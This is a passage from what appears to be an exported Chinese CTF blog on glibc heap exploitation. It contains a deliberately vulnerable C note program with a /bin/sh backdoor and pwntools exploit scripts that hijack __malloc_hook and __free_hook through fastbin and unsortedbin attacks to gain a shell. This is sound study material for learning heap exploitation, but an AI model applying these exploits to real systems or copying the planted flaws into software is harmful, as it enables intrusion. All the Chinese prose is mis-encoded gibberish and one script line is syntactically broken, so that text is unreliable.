p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5a0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+53) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(fake_rsp) + p64(ret)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(0x0) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\nâ–²è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºldåŠ¨æ€è¿æ¥åŠ è½½çš„äº‹æƒ…ï¼Œæ‰€ä»¥å°±ç®—æ˜¯åŒä¸€ä¸ªç‰ˆæœ¬ä¸­çš„link_mapç›¸å¯¹äºlibcåŸºåœ°å€åœ¨ä¸åŒæœºå™¨ä¸­ä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œéœ€è¦çˆ†ç ´ç¬¬4ï¼Œ5ä¸¤ä½ï¼Œä¸€ä¸ªå­—èŠ‚ã€‚\n\n## 2.è§¦å‘æ¡ä»¶\n\n(1)è°ƒç”¨exit()\n(2)èƒ½å¤Ÿä»mainå‡½æ•°è¿”å›\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nbanæ‰äº†å¾ˆå¤šä¸œè¥¿çš„æ—¶å€™ã€‚ä½†æ˜¯è¿™ä¸ªéœ€è¦æ³„éœ²åœ°å€æ‰è¡Œçš„ï¼Œå¦å¤–ç”±äºå¯èƒ½éœ€è¦çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¦‚æœè¿˜æ¶‰åŠå…¶ä»–çš„çˆ†ç ´å°±å¾—æ…é‡è€ƒè™‘ä¸€ä¸‹äº†ï¼Œåˆ«åˆ°æ—¶å€™çˆ†å¾—é»„èŠ±èœéƒ½å‡‰äº†ã€‚\n","tags":["Heap"],"categories":["PWN","pwnå †-Skill"]},{"title":"å„ç‰ˆæœ¬UAFä¸“åœº","url":"/2021/08/19/å„ç‰ˆæœ¬UAFä¸“åœº/","content":"\n# å‰è¨€\n\nä¸€èˆ¬æ¥è¯´UAFéƒ½æ˜¯æ¯”è¾ƒå¥½åˆ©ç”¨çš„ï¼Œå°¤å…¶æ˜¯åœ¨æœ‰tcacheçš„ç‰ˆæœ¬ä¸‹ï¼Œ2.32ä¹‹å‰ï¼Œæ²¡æœ‰å¯¹fdåšä»»ä½•æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰å¯¹sizeåšä»»ä½•æ£€æŸ¥ï¼Œé‚£ä¹ˆç›´æ¥æ”¹fdå°±èƒ½æƒ³ç”³è¯·å“ªå„¿å°±ç”³è¯·å“ªå„¿ã€‚ä½†æ˜¯è¿™é‡Œå°±é¢ä¸´åœ°å€çš„é—®é¢˜ï¼Œæ‰€ä»¥é«˜ç‰ˆæœ¬ä¸‹çš„UAFå¸¸å¸¸ä¸ä¼šç»™ä½ Showå‡½æ•°ï¼Œé€šå¸¸ç»“åˆFSOPæ¥çˆ†ç ´æ³„éœ²åœ°å€ã€‚è€Œä½ç‰ˆæœ¬çš„ï¼Œæ²¡æœ‰tcacheçš„æ—¶å€™ï¼Œä¸ç»™showå‡½æ•°ä¼šæ›´åŠ å›°éš¾ï¼Œå› ä¸ºfastbin attackä¼šæ£€æŸ¥sizeä½ï¼Œé€šå¸¸è¿˜éœ€è¦ä¼ªé€ ã€‚\n\nè¿™é‡Œå°±2.23~2.32ç‰ˆæœ¬çš„UAFåšä¸ªæ€»ç»“åˆ©ç”¨ï¼Œå„ä¸ªæ¡ä»¶çš„ç¼©å‡ã€‚\n\n# ä¸€ã€é¢˜ç›®åŠè°ƒè¯•è„šæœ¬\n\nâ–²é¦–å…ˆç»™å‡ºè‡ªå·±ä¸ºäº†æ–¹ä¾¿è°ƒè¯•å†™çš„é¢˜å’Œå¯¹åº”çš„expï¼Œå­˜åœ¨UAFï¼Œå †æº¢å‡ºï¼Œåé—¨ï¼Œmallocå’Œcallocåˆ‡æ¢ç­‰å¤šä¸ªæ¼æ´ï¼Œä½†æ˜¯å»é™¤äº†Double freeå‚è€ƒnoteé¢˜ç›®ï¼š\n\n```c\n//gcc -ggdb note.c -o note\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar* notelist[1000];\nint* freelist[1000];\n\nint count = 0;\n\n\nvoid backdoor() {\n   puts(\"You hacked me!!\");\n   system(\"/bin/sh\");\n}\n\nvoid malloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)malloc(size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid calloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)calloc(0x1,size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid del_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx] && (freelist[idx] != idx))\n    {\n        free(notelist[idx]);\n        freelist[idx] = idx;\n        puts(\"Success!\");\n        return;\n    }\n    else\n    {\n        puts(\"Can not double free!\");\n        return;\n        \n\n    }\n\n}\n\nvoid print_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx])\n    {\n        puts(notelist[idx]);\n        return;\n    }\n}\n\nvoid edit_note()\n{\n    char buf[8];\n    int idx;\n    int size;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    printf(\"Size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    if (notelist[idx])\n    {\n        printf(\"Content :\");\n        read(0, notelist[idx], size);\n        puts(\"Success!\");\n        return;\n    }\n}\n\n\nvoid menu() {\n    puts(\"----------------------\");\n    puts(\"       MY  NOTE       \");\n    puts(\"----------------------\");\n    puts(\" 1. Malloc Add note   \");\n    puts(\" 2. Delete note       \");\n    puts(\" 3. Print note        \");\n    puts(\" 4. Edit note         \");\n    puts(\" 5. Calloc Add note   \");\n    puts(\" 6. Exit              \");\n    puts(\"--------Author:PIG-007\");\n    printf(\"Your choice :\");\n};\n\nint main() {\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n    freelist[0] = 1001;\n    char* heap_leak = (char*)(malloc(0x438));\n    printf(\"Gift_Heap:%p\\n\",heap_leak);\n\n    char* libc_leak = (char*)&printf;\n    printf(\"Gift_Libc:%p\\n\",libc_leak);\n    \n    char* elf_leak = (char*)&main;\n    printf(\"Gift_elf:%p\\n\",elf_leak);\n    \n    free(heap_leak);\n    heap_leak = NULL;\n    libc_leak = NULL;\n    elf_leak = NULL;\n    char buf[4];\n    while (1) {\n        menu();\n        read(0, buf, 4);\n        switch(atoi(buf))\n        {\n            case 1:\n                malloc_add_note();\n                break;\n            case 2:\n                del_note();\n                break;\n            case 3:\n                print_note();\n                break;\n            case 4:\n                edit_note();\n                break;\n            case 5:\n                calloc_add_note();\n                break;\n            case 6:\n                exit(0);\n                break;\n            default:\n                puts(\"Invalid choice!\");\n                break;\n        }\n    }\n    return 0;\n\n}\n```\n\n å¯¹åº”expè®¾ç½®ï¼š\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\n#from LibcSearcher import *\nimport commands\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\ncontext.timeout = 0.5\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./note\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\nelf = ELF(binary)\nlargeBinIdx = 1096\nunsortedBinIdx = 88\n\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add_malloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'1')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef free(idx):\n\tp.sendlineafter(\"Your choice :\",'2')\n\tp.sendlineafter('Index :',str(idx))\n\ndef show(idx):\n\tp.sendlineafter(\"Your choice :\",'3')\n\tp.sendlineafter('Index :',str(idx))\n    \ndef edit(idx,size,content):\n\tp.sendlineafter(\"Your choice :\",'4')\n\tp.sendlineafter('Index :',str(idx))\n\tp.sendlineafter('Size :',str(size))\n\tp.sendafter('Content :',content)    \n    \ndef add_calloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'5')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef exit():\n\tp.sendlineafter(\"Your choice :\",'6')\n\ndef edit_m(idx,size,content):\n\tsleep(0.01)\n\tp.sendline('4')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef free_m(idx):\n\tsleep(0.01)\n\tp.sendline('2')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\ndef add_malloc_m(size,content):\n\tsleep(0.01)\n\tp.sendline('1')\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef tcacheDelete(idx):\n\tfor i in range(7):\n\t\tfree(i+idx)\n        \ndef tcacheMalloc(size):\n\tfor i in range(7):\n\t\tadd_malloc(size,'\\x00')\n\ndef leak_heap():\n\tglobal largeBinIdx\n\tglobal unsortedBinIdx\n\tru(\"Gift_Heap:0x\")\n\tLeakHeap = int(rc(12),16)\n\tlog.info(\"LeakHeap:0x%x\"%LeakHeap)\n\tpath = libc.path\n\t#version = [\"2.23\",\"2.27\",\"2.29\",\"2.31\",\"2.32\",\"2.33\"]\n\tif(\"2.23\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.24\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.25\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.26\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.27\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.28\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.29\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.30\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.31\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.32\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.33\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telse:\n\t\tprint(\"Version Wrong!\")\n\t\tquit()\n\treturn heap_base\n\ndef leak_elf():\n\tru(\"Gift_elf:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakElf:0x%x\"%Leak)\n\treturn Leak\n\ndef leak_libc():\n\tru(\"Gift_Libc:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakLibc:0x%x\"%Leak)\n\treturn Leak\n\ndef getMain_arena(libc_base):\n\treturn libc_base+libc.sym['__malloc_hook']+0x10\n\ndef getOnegadget():\n    originStr=commands.getstatusoutput('one_gadget ' + context.binary.libc.path)[1]\n    print originStr\n    one_gadget = []\n    lstKey = [] \n    lengthKey = 0\n    key = 'execve'\n    countStr = originStr.count(key)\n    if countStr < 1:\n        print('No one_gadget')\n    elif countStr == 1: #only one one_gadget\n        indexKey = originStr.find(key)\n        one_gadget.append(int(originStr[indexKey-8:indexKey-1],16))\n        return one_gadget\n    else: #multiple one_gadgey\n        indexKey = originStr.find(key)\n        lstKey.append(indexKey) \n        while countStr > 1:\n            str_new = originStr[indexKey+1:len(originStr)+1]\n            indexKey_new = str_new.find(key)\n            indexKey = indexKey+1 +indexKey_new\n            lstKey.append(indexKey)\n            countStr -= 1\n        for i in range(len(lstKey)):\n            one_gadget.append(int(originStr[(lstKey[i]-8):lstKey[i]-1],16))\n        return one_gadget\n\n    \ndef pwn():\n    heap_base = leak_heap()\n    libc_base = leak_libc() - libc.sym['printf']\n    elf_base = leak_elf() - elf.sym['main']\n    log.info(\"heap_base:0x%x\"%heap_base)\n    log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"elf_base:0x%x\"%elf_base)\n    add_malloc(0x1000-0x290-0x8,'PIG007NB')\n\n    \n    \ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n\n\n# äºŒã€ç¯å¢ƒæ­å»º\n\n## å‰è¨€\n\nä¼—æ‰€å‘¨çŸ¥ï¼Œpwnçš„Glibcç¯å¢ƒå‘æ¥æ˜¯ä¸€ä¸ªéš¾è§£é¢˜ï¼Œå¾ˆå¤šå¤§ä½¬åœ¨ç¼–è¯‘ä¸åŒç‰ˆæœ¬çš„Glibcéƒ½å¾ˆå¤´ç–¼ï¼Œä¸€ä¸ªä¸æ³¨æ„å°±å®¹æ˜“å‡ºé”™ã€‚åƒGithubä¸Šçš„`glibc-all-in-one`æ­é…`patchelf`\n\n`glibc-all-in-one`:[matrix1001/glibc-all-in-one: ğŸA convenient glibc binary and debug file downloader and source code auto builder (github.com)](https://github.com/matrix1001/glibc-all-in-one)\n\n`patchelf`:[NixOS/patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)](https://github.com/NixOS/patchelf)\n\nå¯¹äºæ–°æ‰‹æ¥è¯´æä¸ªè™šæ‹Ÿæœºç¼–è¯‘ç¯å¢ƒä¸€ä¸ªåŒ…æ²¡è£…å¥½å°±å®¹æ˜“æŒ‚æ‰ï¼Œç„¶åå°±GGï¼Œè¿™å®åœ¨æ˜¯å¾ˆæµªè´¹ç”Ÿå‘½çš„ä¸€ä»¶äº‹æƒ…ã€‚è€Œ`patchelf`å…¶å®æœ‰æ—¶å€™ä¹Ÿä¸å¤ªé¡¶ç”¨ï¼Œè¿˜æœ‰`Docker`é‡Œçš„\n\n`pwnDocker`:[skysider/pwndocker - Docker Image | Docker Hub](https://hub.docker.com/r/skysider/pwndocker)\n\nå…¶å®æœ‰æ—¶å€™ä¹Ÿæ„Ÿè§‰ä¸å¤ªå¥½ç”¨ï¼Œè€Œä¸”éœ€è¦ä¾é ä½œè€…æ›´æ–°ï¼Œè‡ªå·±ç¼–è¯‘ä¹Ÿå®¹æ˜“å‡ºé”™ã€‚ä½†æ˜¯è¿™å€’æ˜¯æ¿€å‘äº†æˆ‘ä¸€ä¸ªæƒ³æ³•ï¼Œä¸ºæ¯ä¸ªLibcç‰ˆæœ¬æ­å»ºä¸ªdockerå®¹å™¨ï¼Œç„¶åé€šè¿‡æ˜ å°„å…³ç³»å°†é¢˜ç›®æ˜ å°„è¿›å®¹å™¨ä¸­ï¼Œç›¸å½“äºåªéœ€è¦å®¹å™¨ä¸­çš„libcç¯å¢ƒï¼Œè¿™æ ·å°±ä¸éœ€è¦è€ƒè™‘è¿™äº›ä¸œè¥¿äº†ã€‚\n\n## é¡¹ç›®\n\nç»è¿‡å¤§é‡æµ‹è¯•ï¼Œè‡ªå·±å†™äº†ä¸€ä¸ªå°é¡¹ç›®ï¼Œé€‚åˆæ‰€æœ‰Libcç‰ˆæœ¬ï¼Œåªè¦docker hubä¸­æœ‰å¯¹åº”libcç‰ˆæœ¬çš„ubuntuå®¹å™¨ï¼Œè¯¥å®¹å™¨å¯¹åº”çš„aptæºè¿˜æœ‰åœ¨æ›´æ–°ï¼Œå°±èƒ½ç”¨ï¼Œè·Ÿè‡ªå·±æœ¬èº«ç¯å¢ƒæ²¡å•¥å…³ç³»ã€‚å®æµ‹æ‰€æœ‰ç‰ˆæœ¬éƒ½è¡Œï¼Œä¸€é”®æ­å»ºï¼Œä¸€é”®ä½¿ç”¨ï¼š\n\nGithub:[PIG-007/pwnDockerAll (github.com)](https://github.com/PIG-007/pwnDockerAll)\n\nGitee:[PIG-007/pwnDockerAll (gitee.com)](https://gitee.com/Piggy007/pwnDockerAll)\n\nè¯¦æƒ…çœ‹é¡¹ç›®é‡Œã€‚\n\n\n\n# ä¸‰ã€Glibc2.23\n\n## 1.UAF + Leak + Sizeä¸åšé™åˆ¶ï¼š\n\nè¿™ç§æƒ…å†µç›´æ¥freeè¿›unsortedbinæ³„éœ²åœ°å€ï¼Œç„¶åæ‰“fastbin attackï¼Œå€ŸåŠ©0x7få­—èŠ‚é”™ä½åŠ«æŒmalloc_hookå³å¯ï¼Œæ²¡å•¥æŠ€æœ¯å«é‡ã€‚è¿™é‡Œå†è¯´ä¸€äº›ï¼Œå…¶å®0x56ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¯ä»¥å€ŸåŠ©unsortedbin attackå°†å †åœ°å€å†™åˆ°ä¸€ä¸ªåœ°æ–¹ç„¶åå­—èŠ‚é”™ä½ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png)\n\n0x7fï¼š0111 1**11**1\n\n0x56ï¼š0101 0**11**0\n\nä¸»è¦çœ‹çš„æ˜¯AMä½ï¼ŒåŠ ç²—çš„ä¸¤ä½ï¼Œä¸èƒ½åˆšå¥½æ˜¯10ï¼Œæ£€æµ‹ï¼š\n\n(1)æ˜¯å¦å±äºå½“å‰çº¿ç¨‹çš„main_arena\n\n(2)æ˜¯å¦æ˜¯mmapå‡ºæ¥çš„chunkçš„æ£€æµ‹\n\næ‰€ä»¥æŒ‰ç…§é“ç†æ¥è®²ï¼Œå°¾æ•°ä¸º4 5 c då››ä¸ªç³»åˆ—ä¸èƒ½é€šè¿‡æ£€æµ‹ï¼Œå…¶ä»–éƒ½å¯ä»¥çš„ã€‚è€Œå¯¹äºå †åœ°å€çš„éšæœºæ€§ï¼Œ0x56å’Œ0x55éƒ½æ˜¯å¯èƒ½çš„ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¸€å®šæˆåŠŸï¼ŒåŒæ ·éœ€è¦çˆ†ç ´ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\none_gadget = getOnegadget()\nadd_malloc(0x418,'PIG007NB')\nadd_malloc(0x68,'PIG007NB')\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(88 + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nfree(2)\nedit(2,0x8,p64(libc_base + libc.sym['__malloc_hook']-0x23))\nadd_malloc(0x68,'PIG007NB')\n\nfor i in range(len(one_gadget)):\n    lg(\"one_gadget[\"+str(i)+\"]\",libc_base+one_gadget[i])\nadd_malloc(0x68,'\\x00'*0x13+p64(libc_base+one_gadget[]))\n#add_malloc(0x18,'PIG007NB')\np.sendline('1')\np.sendline('1')\np.sendline('1')\np.interactive()\n```\n\néœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”±äºè¦†å†™äº†_IO_wide_dataéƒ¨åˆ†æ•°æ®ï¼Œæœ‰äº›æ•°æ®å¯èƒ½æ‰“å°ä¸å‡ºæ¥ï¼Œç›´æ¥ä¸€è‚¡è„‘å‘é€ä¿¡æ¯ç”³è¯·å †å—å³å¯ã€‚è‡³äºone_gadgetæ²¡åŠæ³•ç”¨çš„ï¼Œå‚ç…§realloc_hookè°ƒæ•´æ ˆå¸§ã€‚\n\n## 2.UAF + Leak + sizeé™åˆ¶\n\nâ–²æ¯”å¦‚è¯´sizeé™åˆ¶ä¸èƒ½ç”³è¯·0x70å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•å­—èŠ‚é”™ä½ç”³è¯·malloc_hookçš„åœ°æ–¹ã€‚ä¸€èˆ¬æ¥è¯´æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š\n\n(1)åªèƒ½æ˜¯å°Chunkï¼Œå³0x20~0x80ï¼š\n\næ³„éœ²heapåœ°å€ï¼Œä¿®æ”¹FDï¼ŒæŒ‡å‘ä¸Šä¸€ä¸ªchunkæ¥ä¿®æ”¹sizeï¼Œé‡Šæ”¾è¿›å…¥unsortedbinåæ³„éœ²å¾—åˆ°libcåœ°å€ï¼Œä¹‹åå†å€Ÿç”¨0x7fçš„UAFå­—èŠ‚é”™ä½ç”³è¯·å³å¯åˆ°malloc_hookå³å¯ã€‚\n\n(2)åªèƒ½æ˜¯ä¸­ç­‰çš„chunkï¼Œå¤§äºfatsbinå°äºlargebinçš„ï¼Œå³0x90~0x3f0ã€‚\n\næ³„éœ²åœ°å€åï¼Œç›´æ¥ç”¨unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼Œç„¶ååˆ©ç”¨fastbinYé“¾åœ¨main_areanä¸Šç•™ä¸‹sizeï¼Œç”³è¯·è¿‡å»ä¿®æ”¹top_chunkä¸ºmalloc_hook-0x10æˆ–è€…malloc_hook-0x28ï¼Œä¿®å¤unsortedbinä¹‹åå³å¯ä»»æ„ä¿®æ”¹ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\none_gadget = getOnegadget()\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr = main_arena + 80\nidx = (target_addr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(size-0x8,'PIG007NB')\nadd_malloc(0x2f8,'PIG007NB')\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(0xf8,'PIG007NB')\n\nfree(2)\nshow(2)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nmain_arena = libc_base + libc.sym['main_arena']\ntarget_addr = libc_base+libc.sym['global_max_fast']\n\nedit(2,0x18,p64(0x0)+p64(target_addr-0x10))\nadd_malloc(0x2f8,'\\x00')\n\nfree(1)\nedit(1,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\n\nfree(3)\nedit(3,0x8,p64(libc_base + libc.sym['main_arena'] + 0x48))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(malloc_hook-0x28)+p64(0x0)+p64(main_arena+88)*2)\nadd_malloc(0x98,p64(0x0)*2+p64(libc_base + one_gadget[1])+p64(libc_base+libc.sym['realloc']+8))\np.sendline('1')\np.sendline('1')\np.sendline('1')\nit()\n```\n\nè¿™é‡Œå°±åˆ©ç”¨reallocè°ƒæ•´äº†ä¸€ä¸‹æ ˆå¸§\n\n(3)åªèƒ½æ˜¯å¤§chunkï¼Œå³0x400~...\n\næ³„éœ²åœ°å€åï¼Œç›´æ¥ç”¨unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼Œä¹‹ååˆ©ç”¨fastbinYæœºåˆ¶å¯åœ¨free_hooké™„è¿‘ä¼ªé€ å †sizeï¼Œç„¶åç”³è¯·è¿‡å»ä¿®æ”¹free_hookä¸ºsystemï¼Œé‡Šæ”¾å †å—å³å¯ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr_binsY = libc.sym['__free_hook']-0x10\nidx = (target_addr_binsY - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx1\nadd_malloc(0x4f8,'/bin/sh\\x00')\t\t#idx2\n\nadd_malloc(size-0x8,'PIG007NB')\t\t#idx3\nadd_malloc(size+0x10-0x8,'PIG007NB')\t#idx4\n\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\n\ntarget_addr = libc_base+libc.sym['global_max_fast']\nlog.info(\"target_addr:0x%x\"%target_addr)\n#change unsortedBinchunkA\n#chunkA.fd could be anything\n\nedit(1,0x4f8,p64(0x0)+p64(target_addr-0x10)) \n#have to malloc all from unsortedbin\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx4\nfree(3)\nedit(3,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\nfree(4)\nedit(4,0x8,p64(libc_base + target_addr_binsY -0x8))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\nfree(2)\nit()\n```\n\n(4)åªèƒ½æ˜¯æŸä¸ªç‰¹å®šå¤§å°çš„chunkï¼Œæ¯”å¦‚åªèƒ½æ˜¯0x40ï¼Œ0x60ï¼Œä¸€èˆ¬ä¸ä¼šåªèƒ½æ˜¯ä¸€ä¸ªå¤§å°çš„ï¼Œä¸ç„¶åŸºæœ¬æ— æ³•åˆ©ç”¨ã€‚\n\næ³„éœ²åœ°å€heapåœ°å€åï¼Œä¿®æ”¹sizeä½è¿›å…¥unsortedbinä¸­ï¼Œå†æ³„éœ²libcåœ°å€ã€‚ç”±äºæ— æ³•0x56å’Œ0x7få­—èŠ‚é”™ä½åˆ©ç”¨ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨ä¸€ä¸ªsizeçš„binï¼Œé‡Šæ”¾ä¹‹ååœ¨fastbinYä¸­ç•™ä¸‹sizeï¼Œç„¶åå¦ä¸€ä¸ªsizeç”³è¯·è¿‡å»ï¼Œä¿®æ”¹top_chunkåˆ°malloc_hookå¤„å³å¯ï¼Œä¹‹åç±»ä¼¼ã€‚\n\nè¯¦æƒ…å‚ç…§CISCNä¸œåŒ—èµ›åŒºå¤ç°ä¸­çš„é¢˜ç›®small_chunkã€‚\n\n## 3.UAF + æ— Leak + Sizeä¸åšé™åˆ¶\n\nâ–²æ— Leaké€šå¸¸éœ€è¦çˆ†ç ´ï¼ŒåŒæ ·ç”¨unsortedbin attackéƒ¨åˆ†å†™unsortedbinä¸­chunkçš„bkæŒ‡é’ˆï¼Œä¿®æ”¹global_max_fastï¼Œä¹‹ååˆ©ç”¨fastbinYæœºåˆ¶åŠ«æŒ_IO_2_1_stdout_ç»“æ„ä½“ï¼Œæ³„éœ²å‡ºåœ°å€ï¼Œç„¶åå°±å’Œä¹‹å‰ä¸€æ ·ï¼Œå†åˆ©ç”¨fastbinYæœºåˆ¶åŠ«æŒfree_hookå³å¯ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\ndef 